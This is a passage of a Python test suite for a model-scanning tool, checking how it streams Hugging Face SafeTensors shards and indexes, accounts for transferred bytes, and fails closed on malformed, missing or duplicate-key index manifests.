        assert aggregate.bytes_scanned == expected_bytes
        assert aggregate.files_scanned == 3
        assert not any(issue.details.get("max_total_size") == expected_bytes for issue in aggregate.issues)
        assert determine_exit_code(aggregate) == 2
        mock_download.assert_not_called()

    def test_partial_safetensors_index_read_does_not_suppress_full_selected_download(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A failed partial index read and its later full download are distinct transfers."""
        index_name = "model.safetensors.index.json"
        shard_name = "experts/alpha.safetensors"
        index_payload = json.dumps(
            {"weight_map": {"a": shard_name}},
            separators=(",", ":"),
        ).encode()
        frame, header_len = _make_safetensors_frame(
            {"a": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        partial_index_bytes = 7
        assert len(index_payload) == 48
        assert 16 + header_len == 69
        downloaded_index = tmp_path / index_name
        downloaded_index.write_bytes(index_payload)
        repo_files = [index_name, shard_name]
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {index_name: len(index_payload), shard_name: len(frame)},
                _HF_TEST_REVISION,
            ),
        )

        class PartialIndexResponse(_FakeRangeResponse):
            def iter_content(self, chunk_size: int) -> Iterator[bytes]:
                yield self.payload[:partial_index_bytes]
                raise RuntimeError("index range body interrupted")

        partial_index_response = PartialIndexResponse(
            index_payload,
            headers={
                "Content-Range": f"bytes 0-{len(index_payload) - 1}/{len(index_payload)}",
                "Content-Length": str(len(index_payload)),
                "ETag": '"stable"',
            },
            status_code=206,
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            if index_name in url:
                return partial_index_response
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(frame) - 1)
            return _strict_range_response(
                frame[start : end + 1],
                len(frame),
                start_offset=start,
                url=url,
            )

        streamed_items: list[object] = []

        def tracked_stream() -> Iterator[Any]:
            for item in download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            ):
                streamed_items.append(item)
                yield item

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download", return_value=str(downloaded_index)) as mock_download,
        ):
            aggregate = scan_model_streaming(
                tracked_stream(),
                timeout=30,
                delete_after_scan=False,
                cache_enabled=False,
                scanners=["safetensors"],
                skip_file_types=False,
                max_total_size=partial_index_bytes + len(index_payload) + 16 + header_len,
            )

        assert len(streamed_items) == 3
        failure_path, _failure_is_last, failure_result, failure_accounting = _unpack_internal_stream_item(
            streamed_items[0]
        )
        assert failure_path == Path(index_name)
        assert failure_result.bytes_scanned == partial_index_bytes
        assert failure_accounting == StreamedSourceByteAccounting(
            pretransferred_bytes=partial_index_bytes,
            source_bytes_preaccounted=partial_index_bytes,
        )
        selected_path, _selected_is_last, selected_result, selected_accounting = _unpack_internal_stream_item(
            streamed_items[1]
        )
        assert selected_path == downloaded_index
        assert selected_result is None
        assert selected_accounting == StreamedSourceByteAccounting()
        _shard_path, _shard_is_last, shard_result, shard_accounting = _unpack_internal_stream_item(streamed_items[2])
        assert shard_result.bytes_scanned == 69
        assert shard_accounting == StreamedSourceByteAccounting()
        assert aggregate.bytes_scanned == 124
        assert aggregate.files_scanned == 3
        assert determine_exit_code(aggregate) == 2
        mock_download.assert_called_once_with(
            repo_id="test/model",
            filename=index_name,
            revision=_HF_TEST_REVISION,
        )

    @pytest.mark.parametrize("shard_first", [False, True], ids=["index-only", "index-and-header"])
    def test_pretransferred_index_bytes_survive_early_stop_before_later_selected_index(
        self,
        shard_first: bool,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """An early size stop keeps pretransfer bytes and any first precomputed result."""
        index_name = "model.safetensors.index.json"
        shard_name = "experts/alpha.safetensors"
        index_payload = json.dumps({"weight_map": {"a": shard_name}}, separators=(",", ":")).encode()
        frame, header_len = _make_safetensors_frame(
            {"a": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        assert 16 + header_len == 69
        payloads = {index_name: index_payload, shard_name: frame}
        repo_files = [shard_name, index_name] if shard_first else [index_name, shard_name]
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {filename: len(payload) for filename, payload in payloads.items()},
                _HF_TEST_REVISION,
            ),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            filename = index_name if index_name in url else shard_name
            payload = payloads[filename]
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(payload) - 1)
            return _strict_range_response(
                payload[start : end + 1],
                len(payload),
                start_offset=start,
                url=url,
            )

        streamed_items: list[object] = []

        def tracked_stream() -> Iterator[Any]:
            for item in download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            ):
                streamed_items.append(item)
                yield item

        expected_bytes = len(index_payload) + (69 if shard_first else 0)
        max_total_size = len(index_payload) - 1
        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            aggregate = scan_model_streaming(
                tracked_stream(),
                timeout=30,
                delete_after_scan=False,
                cache_enabled=False,
                scanners=["safetensors"],
                skip_file_types=False,
                max_total_size=max_total_size,
            )

        assert len(streamed_items) == 1
        first_item = cast(tuple[Path, bool, Any | None, StreamedSourceByteAccounting], streamed_items[0])
        if shard_first:
            assert first_item[0] == Path(shard_name)
            assert first_item[2] is not None
            assert first_item[2].bytes_scanned == 69
            assert first_item[3] == StreamedSourceByteAccounting(pretransferred_bytes=len(index_payload))
        else:
            assert first_item[0].name == _HF_ACQUIRED_SAFETENSORS_INDEX_BASENAME
            assert first_item[2] is None
            assert first_item[3] == StreamedSourceByteAccounting(
                pretransferred_bytes=len(index_payload),
                source_bytes_preaccounted=len(index_payload),
                source_path=f"hf://test/model@{_HF_TEST_REVISION}/{index_name}",
            )
        assert aggregate.bytes_scanned == expected_bytes
        assert aggregate.files_scanned == int(shard_first)
        assert any(issue.details.get("max_total_size") == max_total_size for issue in aggregate.issues)
        assert determine_exit_code(aggregate) == 2
        mock_download.assert_not_called()

    def test_malformed_safetensors_index_failure_stays_in_filename_family(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A bad family index must not poison another family or a standalone file."""
        foo_index = "foo.safetensors.index.json"
        bar_index = "bar.safetensors.index.json"
        foo_shard = "foo.safetensors"
        bar_shard = "bar.safetensors"
        standalone = "standalone.safetensors"
        foo_index_payload = b"{"
        bar_index_payload = json.dumps(
            {"weight_map": {"bar": bar_shard}},
            separators=(",", ":"),
        ).encode()
        frames = {
            filename: _make_safetensors_frame(
                {name: {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
                b"\x00",
            )
            for filename, name in [
                (foo_shard, "foo"),
                (bar_shard, "bar"),
                (standalone, "standalone"),
            ]
        }
        frame_payloads = {filename: frame for filename, (frame, _header_len) in frames.items()}
        payloads = {
            foo_index: foo_index_payload,
            bar_index: bar_index_payload,
            **frame_payloads,
        }
        repo_files = [foo_index, bar_index, foo_shard, bar_shard, standalone]
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: (repo_files, _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {filename: len(payload) for filename, payload in payloads.items()},
                _HF_TEST_REVISION,
            ),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
            lambda *_args, **_kwargs: "safetensors",
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            filename = next(filename for filename in payloads if filename in url)
            payload = payloads[filename]
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(payload) - 1)
            return _strict_range_response(
                payload[start : end + 1],
                len(payload),
                start_offset=start,
                url=url,
            )

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    max_size=4096,
                    scannable_extensions={".safetensors"},
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )

        results_by_name = {
            path.name: scan_result
            for path, _is_last, scan_result, _accounting in map(_unpack_internal_stream_item, results)
        }
        assert results_by_name[foo_shard].success is False
        assert (
            results_by_name[foo_shard].metadata["remote_shard_family"]["index_incomplete_reason"]
            == "index_read_or_parse_failed"
        )
        assert results_by_name[bar_shard].success is True
        assert results_by_name[bar_shard].metadata["remote_shard_family"]["index_manifest"] == bar_index
        assert results_by_name[standalone].success is True
        assert "remote_shard_family" not in results_by_name[standalone].metadata
        mock_download.assert_not_called()

    @pytest.mark.parametrize(
        ("failure_mode", "expected_reason"),
        [
            ("missing-size", "missing_index_size"),
            ("over-budget", "index_exceeds_max_size_budget"),
            ("unreadable", "index_read_or_parse_failed"),
            ("malformed", "index_read_or_parse_failed"),
        ],
    )
    def test_unparsed_index_failure_is_source_scoped_without_poisoning_shards(
        self,
        failure_mode: str,
        expected_reason: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Unattributable index failures remain explicit without guessed shard ownership."""
        index_name = "model.safetensors.index.json"
        nested_shard = "experts/alpha.safetensors"
        standalone = "standalone.safetensors"
        index_size = 2
        path_sizes: dict[str, int | None] = {
            index_name: None if failure_mode == "missing-size" else index_size,
            nested_shard: 128,
            standalone: 128,
        }
        max_transferred_bytes = 1 if failure_mode == "over-budget" else None
        read_range = MagicMock()
        if failure_mode == "unreadable":
            read_range.side_effect = RuntimeError("index transport unavailable")
        elif failure_mode == "malformed":
            read_range.return_value = SimpleNamespace(
                data=b"{",
                total_size=1,
                validator='"stable"',
                final_url="https://huggingface.co/test/model/index",
                bytes_transferred=1,
            )
        else:
            read_range.side_effect = AssertionError("pre-read failure must not issue a range request")
        monkeypatch.setattr("modelaudit.utils.sources.huggingface._read_huggingface_strict_range", read_range)

        details, _transferred, _acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [nested_shard, standalone],
            [index_name, nested_shard, standalone],
            _HF_TEST_REVISION,
            path_sizes,
            deadline=None,
            max_transferred_bytes=max_transferred_bytes,
        )

        assert details == {}
        assert unscoped_failures[index_name]["index_complete"] is False
        assert unscoped_failures[index_name]["index_incomplete_reason"] == expected_reason
        assert read_range.call_count == int(failure_mode in {"unreadable", "malformed"})

    def test_unparsed_index_without_named_scope_fails_closed_for_same_parent_shard(self) -> None:
        """An unreadable index cannot leave an otherwise unscoped peer falsely clean."""
        index_name = "model.safetensors.index.json"
        shard_name = "alpha.safetensors"

        details, _transferred, _acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [shard_name],
            [index_name, shard_name],
            _HF_TEST_REVISION,
            {index_name: None, shard_name: 128},
            deadline=None,
            max_transferred_bytes=None,
        )

        assert details == {}
        assert unscoped_failures[index_name]["index_complete"] is False
        assert unscoped_failures[index_name]["index_incomplete_reason"] == "missing_index_size"

    @pytest.mark.parametrize(
        ("reported_bytes", "expected_bytes"),
        [
            (17, 17),
            (True, 0),
            (-1, 0),
        ],
        ids=["transferred", "boolean", "negative"],
    )
    def test_unscoped_index_failure_result_validates_transfer_accounting(
        self,
        reported_bytes: object,
        expected_bytes: int,
    ) -> None:
        """Failure results expose real reads once and reject invalid accounting metadata."""
        result = _remote_safetensors_index_failure_result(
            "test/model",
            "model.safetensors.index.json",
            _HF_TEST_REVISION,
            {
                "index_bytes_transferred": reported_bytes,
                "index_incomplete_reason": "index_read_or_parse_failed",
            },
        )

        assert result.bytes_scanned == expected_bytes
        assert result.metadata["remote_bytes_transferred"] == (17 if reported_bytes == 17 else 0)
        assert result.success is False

    def test_unscoped_index_failure_makes_streaming_scan_inconclusive(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """An unattributable manifest failure cannot disappear behind a clean shard header."""
        index_name = "model.safetensors.index.json"
        shard_name = "experts/alpha.safetensors"
        index_payload = b"{!"
        frame, header_len = _make_safetensors_frame(
            {"alpha": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]}},
            b"\x00",
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([index_name, shard_name], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {index_name: len(index_payload), shard_name: len(frame)},
                _HF_TEST_REVISION,
            ),
        )

        def range_response(url: str, *, headers: dict[str, str], **_kwargs: object) -> _FakeRangeResponse:
            payload = index_payload if index_name in url else frame
            start_text, end_text = headers["Range"].removeprefix("bytes=").split("-", 1)
            start, end = int(start_text), min(int(end_text), len(payload) - 1)
            return _strict_range_response(
                payload[start : end + 1],
                len(payload),
                start_offset=start,
                url=url,
            )

        with (
            patch("requests.get", side_effect=range_response),
            patch("huggingface_hub.hf_hub_download") as mock_download,
        ):
            streamed_results = list(
                download_model_streaming(
                    f"hf://test/model?revision={_HF_TEST_REVISION}",
                    scannable_extensions={".safetensors"},
                    scannable_filenames=set(),
                    scannable_scanner_ids={"safetensors"},
                    _include_scan_results=True,
                )
            )

        assert [item[0] for item in streamed_results] == [Path(index_name), Path(shard_name)]
        _index_path, index_is_last, index_result, index_accounting = cast(
            tuple[Path, bool, Any, StreamedSourceByteAccounting], streamed_results[0]
        )
        _shard_path, shard_is_last, shard_result = cast(tuple[Path, bool, Any], streamed_results[1])
        assert index_is_last is False
        assert index_result.success is False
        assert index_result.bytes_scanned == len(index_payload)
        assert index_result.metadata["remote_bytes_transferred"] == len(index_payload)
        assert index_accounting == StreamedSourceByteAccounting(
            pretransferred_bytes=len(index_payload),
            source_bytes_preaccounted=len(index_payload),
        )
        assert "remote_safetensors_index_reconciliation_incomplete" in index_result.metadata["scan_outcome_reasons"]
        assert shard_is_last is True
        assert shard_result.success is True
        assert "remote_shard_family" not in shard_result.metadata

        aggregate = scan_model_streaming(
            iter(streamed_results),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["safetensors"],
            skip_file_types=False,
        )

        assert aggregate.has_errors is True
        assert aggregate.success is False
        assert aggregate.bytes_scanned == len(index_payload) + 16 + header_len
        assert determine_exit_code(aggregate) == 2
        assert any(check.name == "Hugging Face SafeTensors Index Reconciliation" for check in aggregate.checks)

        bounded_aggregate = scan_model_streaming(
            iter(streamed_results),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["safetensors"],
            skip_file_types=False,
            max_total_size=len(index_payload) - 1,
        )

        assert bounded_aggregate.bytes_scanned == len(index_payload)
        assert bounded_aggregate.files_scanned == 1
        assert any(check.name == "Hugging Face SafeTensors Index Reconciliation" for check in bounded_aggregate.checks)
        assert any(issue.details.get("max_total_size") == len(index_payload) - 1 for issue in bounded_aggregate.issues)
        mock_download.assert_not_called()

    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_unscoped_index_failure_does_not_poison_valid_manifest_relationships(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
    ) -> None:
        """An unrelated malformed manifest remains source-scoped beside valid shard evidence."""
        valid_index = "bar.safetensors.index.json"
        malformed_index = "model.safetensors.index.json"
        valid_shard = "bar.safetensors"
        unrelated_nested = "experts/standalone.safetensors"
        valid_payload = json.dumps({"weight_map": {"bar": valid_shard}}, separators=(",", ":")).encode()
        malformed_payload = b"{"
        payloads = {valid_index: valid_payload, malformed_index: malformed_payload}
        mock_hf_hub_url.side_effect = lambda *, repo_id, filename, revision: (
            f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
        )
        mock_requests_get.side_effect = [
            _strict_range_response(payloads[filename], len(payloads[filename])) for filename in sorted(payloads)
        ]

        details, transferred, acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [valid_shard, unrelated_nested],
            [valid_index, malformed_index, valid_shard, unrelated_nested],
            _HF_TEST_REVISION,
            {
                valid_index: len(valid_payload),
                malformed_index: len(malformed_payload),
                valid_shard: 128,
                unrelated_nested: 128,
            },
            deadline=None,
            max_transferred_bytes=None,
        )

        assert transferred == len(valid_payload) + len(malformed_payload)
        assert acquired_indexes == payloads
        assert details[valid_shard]["index_complete"] is True
        assert unrelated_nested not in details
        assert unscoped_failures[malformed_index]["index_incomplete_reason"] == "index_read_or_parse_failed"

    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_remote_safetensors_incomplete_index_cannot_be_overwritten(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
    ) -> None:
        shard = "model.safetensors"
        first_index = "a.safetensors.index.json"
        second_index = "z.safetensors.index.json"
        incomplete_payload = json.dumps(
            {"weight_map": {"tensor": shard, "missing": "missing.safetensors"}},
            separators=(",", ":"),
        ).encode()
        complete_payload = json.dumps(
            {"weight_map": {"tensor": shard}},
            separators=(",", ":"),
        ).encode()
        mock_hf_hub_url.side_effect = lambda *, repo_id, filename, revision: (
            f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
        )
        mock_requests_get.side_effect = [
            _strict_range_response(incomplete_payload, len(incomplete_payload)),
            _strict_range_response(complete_payload, len(complete_payload)),
        ]

        details, transferred, acquired_indexes, unscoped_failures = _remote_safetensors_index_details_by_file(
            "test/model",
            [shard],
            [first_index, second_index, shard],
            _HF_TEST_REVISION,
            {
                first_index: len(incomplete_payload),
                second_index: len(complete_payload),
                shard: 100,
            },
            deadline=None,
            max_transferred_bytes=4096,
        )

        assert transferred == len(incomplete_payload) + len(complete_payload)
        assert unscoped_failures == {}
        assert acquired_indexes == {
            first_index: incomplete_payload,
            second_index: complete_payload,
        }
        assert details[shard]["complete"] is False
        assert details[shard]["index_complete"] is False
        assert details[shard]["index_manifest_count"] == 2
        assert details[shard]["index_manifests"] == [first_index, second_index]

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_download_model_streaming_uses_safetensors_index_for_nonstandard_shards(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A SafeTensors index should prove relationships for nonstandard shard names."""
        index_name = "model.safetensors.index.json"
        shard_a = "experts/alpha.safetensors"
        shard_b = "experts/beta.safetensors"
        frame_a, header_len_a = _make_safetensors_frame(
            {"alpha": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        frame_b, header_len_b = _make_safetensors_frame(
            {"beta": {"dtype": "U8", "shape": [6], "data_offsets": [0, 6]}},
            b"\x00" * 6,
        )
        index_payload = json.dumps(
            {
                "metadata": {"total_size": 10},
                "weight_map": {
                    "alpha": shard_a,
                    "beta": shard_b,
                },
            },
            separators=(",", ":"),
        ).encode("utf-8")
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([index_name, shard_a, shard_b], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {
                    index_name: len(index_payload),
                    shard_a: len(frame_a),
                    shard_b: len(frame_b),
                },
                _HF_TEST_REVISION,
            ),
        )
        mock_hf_hub_url.side_effect = lambda *, repo_id, filename, revision: (
            f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
        )
        mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        mock_requests_get.side_effect = [
            _strict_range_response(index_payload, len(index_payload)),
            _strict_range_response(frame_a[:8], len(frame_a)),
            _strict_range_response(frame_a[: 8 + header_len_a], len(frame_a)),
            _strict_range_response(frame_b[:8], len(frame_b)),
            _strict_range_response(frame_b[: 8 + header_len_b], len(frame_b)),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )
        first_result = cast(tuple[Path, bool, Any, StreamedSourceByteAccounting], results[0])
        second_result = cast(tuple[Path, bool, Any], results[1])

        assert [first_result[0].as_posix(), second_result[0].as_posix()] == [shard_a, shard_b]
        for streamed in (first_result[:3], second_result):
            _path, _is_last, scan_result = streamed
            shard_family = scan_result.metadata["remote_shard_family"]
            assert scan_result.success is True
            assert shard_family["index_complete"] is True
            assert shard_family["index_manifest"] == index_name
            assert shard_family["index_referenced_by_manifest"] is True
            assert shard_family["index_bytes_transferred"] == len(index_payload)
            assert "pattern" not in shard_family
        assert first_result[2].bytes_scanned == 16 + header_len_a
        assert second_result[2].bytes_scanned == 16 + header_len_b
        assert first_result[3] == StreamedSourceByteAccounting(pretransferred_bytes=len(index_payload))

        aggregate = scan_model_streaming(
            iter(results),
            timeout=30,
            delete_after_scan=False,
            cache_enabled=False,
            scanners=["safetensors"],
            skip_file_types=False,
            max_total_size=len(index_payload) + 32 + header_len_a + header_len_b,
        )

        assert aggregate.bytes_scanned == len(index_payload) + 32 + header_len_a + header_len_b
        assert aggregate.files_scanned == 2
        assert aggregate.success is True
        mock_hf_hub_download.assert_not_called()
        assert mock_requests_get.call_args_list[0].kwargs["headers"]["Range"] == f"bytes=0-{len(index_payload) - 1}"

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_download_model_streaming_fails_closed_for_missing_safetensors_index_shard(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Missing files referenced by an index should make header coverage inconclusive."""
        index_name = "model.safetensors.index.json"
        present_shard = "experts/alpha.safetensors"
        missing_shard = "experts/beta.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"alpha": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        index_payload = json.dumps(
            {
                "metadata": {"total_size": 10},
                "weight_map": {
                    "layers.0.weight": present_shard,
                    "layers.1.weight": missing_shard,
                },
            },
            separators=(",", ":"),
        ).encode("utf-8")
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([index_name, present_shard], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {
                    index_name: len(index_payload),
                    present_shard: len(frame),
                },
                _HF_TEST_REVISION,
            ),
        )
        mock_hf_hub_url.side_effect = lambda *, repo_id, filename, revision: (
            f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
        )
        mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        mock_requests_get.side_effect = [
            _strict_range_response(index_payload, len(index_payload)),
            _strict_range_response(frame[:8], len(frame)),
            _strict_range_response(frame[: 8 + header_len], len(frame)),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(results[0])
        shard_family = scan_result.metadata["remote_shard_family"]
        assert scan_result.success is False
        assert "remote_safetensors_shard_coverage_incomplete" in scan_result.metadata["scan_outcome_reasons"]
        assert shard_family["index_complete"] is False
        assert shard_family["index_missing_shard_count"] == 1
        assert shard_family["index_missing_shards"] == [missing_shard]
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={})
    @patch("huggingface_hub.hf_hub_url")
    @patch("requests.get")
    def test_download_model_streaming_fails_closed_for_duplicate_safetensors_index_keys(
        self,
        mock_requests_get: MagicMock,
        mock_hf_hub_url: MagicMock,
        mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Duplicate tensor keys in an index should not be collapsed into clean coverage."""
        index_name = "model.safetensors.index.json"
        shard_a = "experts/alpha.safetensors"
        shard_b = "experts/beta.safetensors"
        frame_a, header_len_a = _make_safetensors_frame(
            {"alpha": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        frame_b, header_len_b = _make_safetensors_frame(
            {"beta": {"dtype": "U8", "shape": [6], "data_offsets": [0, 6]}},
            b"\x00" * 6,
        )
        index_payload = (
            b'{"metadata":{"total_size":10},"weight_map":{'
            b'"layers.0.weight":"experts/alpha.safetensors",'
            b'"layers.0.weight":"experts/beta.safetensors"}}'
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([index_name, shard_a, shard_b], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: (
                {
                    index_name: len(index_payload),
                    shard_a: len(frame_a),
                    shard_b: len(frame_b),
                },
                _HF_TEST_REVISION,
            ),
        )
        mock_hf_hub_url.side_effect = lambda *, repo_id, filename, revision: (
            f"https://huggingface.co/{repo_id}/resolve/{revision}/{filename}"
        )
        mock_build_headers.side_effect = lambda *, token=None, headers=None: headers or {}
        mock_requests_get.side_effect = [
            _strict_range_response(index_payload, len(index_payload)),
            _strict_range_response(frame_a[:8], len(frame_a)),
            _strict_range_response(frame_a[: 8 + header_len_a], len(frame_a)),
            _strict_range_response(frame_b[:8], len(frame_b)),
            _strict_range_response(frame_b[: 8 + header_len_b], len(frame_b)),
        ]

        results = list(
            download_model_streaming(
                f"hf://test/model?revision={_HF_TEST_REVISION}",
                max_size=4096,
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
                _include_scan_results=True,
            )
        )

        assert len(results) == 2
        for streamed in results:
            _path, _is_last, scan_result, _accounting = _unpack_internal_stream_item(streamed)
            shard_family = scan_result.metadata["remote_shard_family"]
            assert scan_result.success is False
            assert "remote_safetensors_shard_coverage_incomplete" in scan_result.metadata["scan_outcome_reasons"]
            assert shard_family["index_complete"] is False
            assert shard_family["index_weight_map_tensor_count"] == 2
            assert shard_family["index_duplicate_json_key_count"] == 1
            assert shard_family["index_duplicate_json_keys"] == ["layers.0.weight"]
        mock_hf_hub_download.assert_not_called()

    @patch("huggingface_hub.hf_hub_download")
    @patch("huggingface_hub.utils.build_hf_headers", return_value={"Authorization": "Bearer hf_secret"})
    @patch("huggingface_hub.hf_hub_url", return_value="https://huggingface.co/test/model/resolve/rev/model.safetensors")
    @patch("requests.get")
    def test_download_model_streaming_accepts_huggingface_cloudfront_range_redirect(
        self,
        mock_requests_get: MagicMock,
        _mock_hf_hub_url: MagicMock,
        _mock_build_headers: MagicMock,
        mock_hf_hub_download: MagicMock,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Signed Hugging Face CDN redirects should still be bounded and validated."""
        filename = "model-00001-of-00001.safetensors"
        frame, header_len = _make_safetensors_frame(
            {"tensor": {"dtype": "U8", "shape": [4], "data_offsets": [0, 4]}},
            b"\x00" * 4,
        )
        declared_size = len(frame)
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            lambda *_args, **_kwargs: ([filename], _HF_TEST_REVISION, None),
        )
        monkeypatch.setattr(
            "modelaudit.utils.sources.huggingface._get_huggingface_path_sizes",
            lambda *_args, **_kwargs: ({filename: declared_size}, _HF_TEST_REVISION),
        )
        _mock_build_headers.side_effect = lambda *, token=None, headers=None: {
            "Authorization": "Bearer hf_secret",
            **(headers or {}),
        }
        cloudfront_url = "https://d111111abcdef8.cloudfront.net/model.safetensors?signature=redacted"
        mock_requests_get.side_effect = [
            _FakeRangeResponse(b"", headers={"Location": cloudfront_url}, status_code=302),
            _FakeRangeResponse(
                frame[:8],
                headers={
                    "Content-Range": f"bytes 0-7/{declared_size}",
                    "Content-Length": "8",
                    "ETag": '"stable"',
                },
                status_code=206,
                url=cloudfront_url,
            ),
            _FakeRangeResponse(b"", headers={"Location": cloudfront_url}, status_code=302),
            _FakeRangeResponse(
                frame[: 8 + header_len],
                headers={
                    "Content-Range": f"bytes 0-{7 + header_len}/{declared_size}",
                    "Content-Length": str(8 + header_len),
                    "ETag": '"stable"',
                },
                status_code=206,
                url=cloudfront_url,
            ),
